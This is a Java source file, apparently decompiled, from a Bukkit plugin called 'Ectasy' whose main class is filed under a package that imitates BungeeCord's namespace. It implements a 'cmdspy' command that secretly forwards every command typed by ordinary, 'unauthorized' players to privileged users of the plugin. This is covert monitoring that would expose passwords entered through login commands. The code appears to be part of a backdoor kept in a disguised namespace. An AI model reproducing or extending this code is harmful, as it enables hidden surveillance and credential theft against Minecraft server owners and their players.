package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

@CommandInfo(
   name = "cmdspy",
   description = "Lets you spy on other players commands",
   blatant = true,
   rank = Rank.LITE
)
public class CmdSpyCommand extends AbstractCommand implements Listener {
   @EventHandler
   public void onCmd(PlayerCommandPreprocessEvent var1) {
      User var2 = Ectasy.users.get(var1.getPlayer().getName());
      if (var2.rank == Rank.UNAUTHORIZED) {
         for(User var4 : Ectasy.users.values()) {
            if (var4.spyingCmd) {
               ChatUtil.sendChat(var4.player, "[" + var1.getPlayer().getName() + "] " + var1.getMessage());
            }
         }
      }
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      if (var4.spyingCmd) {
         var4.spyingCmd = false;
         ChatUtil.sendChat(var1.getPlayer(), "Cmdspy is now §cdisabled§f.");
      } else {
         var4.spyingCmd = true;
         ChatUtil.sendChat(var1.getPlayer(), "Cmdspy is now §aenabled§f.");
      }
   }
}
